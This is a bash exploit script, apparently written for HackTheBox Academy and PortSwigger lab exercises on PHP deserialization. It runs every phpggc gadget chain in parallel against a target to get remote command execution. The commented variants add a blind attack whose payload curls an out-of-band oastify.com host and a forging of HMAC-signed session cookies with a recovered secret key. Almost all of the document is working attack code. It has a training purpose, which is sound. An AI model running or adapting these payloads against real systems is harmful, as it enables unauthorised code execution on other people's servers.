#!/bin/bash
# I created this script to solve the HackTheBox Academy section of "Exploiting PHP Deserialization".  This script will iterate through all the gadgets, 
# run the gadget, and tell us if the gadget is successful.  Before running the script, register a user and log in. 

function deserialization_attack() {
gadget=$1
user_cmd='id'   # replace with the command you want over here
payload=$(phpggc "$gadget" system "$user_cmd" -b 2>/dev/null)

request=$(curl -sq "http://10.129.106.253:8000/settings-ie" --cookie 'XSRF-TOKEN=eyJpdiI6InV3YXg0ZjZhNnJlbFVYeiswZlRQUWc9PSIsInZhbHVlIjoicG9YTGh5cHM4dXk0VzFTNll6MmdBYVRFNW42Y25SVTU0OGM0dmxPZ2lLZGQ1cHNweDlUVVBDOVRIazd4Y01LNXpLS09HZk1CbWppdjZiYWZhRVhtK0FhT09wQUM2SFNvTGZQeThXVnFwY3V5KzVNNkw0aDhaNThvamxaL3cwN3giLCJtYWMiOiI5YjU4NmFlMTVhY2QyM2MyMmEwZjdlMWUyNGU1ZDdmZDcyMmRlNzhiZTVmZmM5ZGNjYzUxZjAwZjdhNjFiMjgxIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlN2bTNIcHpNZVprSU83TWVyUm1adVE9PSIsInZhbHVlIjoicS9CbkpMaEtkcVNMdXBIL1ZWYm1RcUpzeU95d1FMQjREaHhyNUhsUU1GeWxkUkl6MkZTRHQyOHhHV2Jhd0pNdEI3V01HRXhvU2ZSMlJRQWZBUzAwbUIyaGVMOFJNelNSUGQxRnUwa3R3NHZSQ0JxdklQVDZtN1BiSTlYZDF2L2ciLCJtYWMiOiJhZThiNTE4YTEwNWFiNjIyMzRmZTIyMTMwYzFhMTY2OTlkNjI2YjQxMWU1NTFjYTUzYTc1ZmNhYzBlYTRhZjgzIiwidGFnIjoiIn0%3D' \
--data-binary "_token=OFWPfyChgSPx34tOrhrwQMs48TFauy0HeK96GGk3&settings=$payload&import=" --proxy "http://127.0.0.1:8080"|grep gid)

# Check if the gadget was successful
if [[ $request == *gid* ]];
  then echo "gadget $gadget is successful: $request";
  fi;
}

export -f deserialization_attack

parallel -j 100 deserialization_attack ::: $(phpggc -l |awk '{print $1}')

:<<'comment'
Scenario #2: To run a different command than 'id', then a good way to check if it succeeds (instead of grep) is with the length the response returns.  
To get the response length, add to the end of the curl command:  -w "%{size_download}\n" -o /dev/null)

Then to check if the gadget was successful: successful gadgets return a length greater then 6620 in this case. So replace the check part with:
if [[ $request > 6620 ]];
  then echo "gadget $gadget is successful";
  fi;
}

Scenario #3: If there's no output returned to the screen to check if the attack is successful (blind attack) then use the below script:
function deserialization_attack() {
gadget=$1
user_cmd='curl 5hn9p4mi072kfp0ta1s1ygp8azgq4iw6l.oastify.com'   
payload=$(phpggc "$gadget" system "$user_cmd" -b 2>/dev/null|xargs -I {} urlencode {})
curl -k -sq "https://0a6c0040036e2e6e80ce03b4001a00ef.web-security-academy.net" --cookie "sesssion=$payload" --proxy "127.0.0.1:8080" >/dev/null
}
export -f deserialization_attack
parallel -j 100 deserialization_attack ::: $(phpggc -l |awk '{print $1}')

Scenario #4: If the server generates a digital signature to check the integrity of the data then use the below script:
#!/bin/bash
function deserialization_attack() {
gadget=$1
user_cmd='curl f7njfecsqhsu5zq30biboqfi0960uusih.oastify.com'
payload=$(phpggc "$gadget" system "$user_cmd" -b 2>/dev/null)

# Secret key.  Without finding the seceret key value, this script will not generate a correct signnature.  
secretKey="nsd3ms9z7fz16e2qfxnc6u393pnp4fqo"

# Data to be signed
data="$payload"

# Calculate the HMAC-SHA1 signature
signature=$(echo -n "$data" | openssl dgst -sha1 -hmac "$secretKey" | awk '{print $2}')

cookie=$(echo -n '{"token":"'$payload'","sig_hmac_sha1":"'$signature'"}'|xargs -0 -I {} urlencode {})

curl -k -sq "https://0a5600c2037e30f383f4bb6c000400cc.web-security-academy.net/my-account" --cookie "session=$cookie" --proxy "127.0.0.1:8080" >/dev/null
}

export -f deserialization_attack
parallel -j 100 deserialization_attack ::: $(phpggc -l |awk '{print $1}')
comment
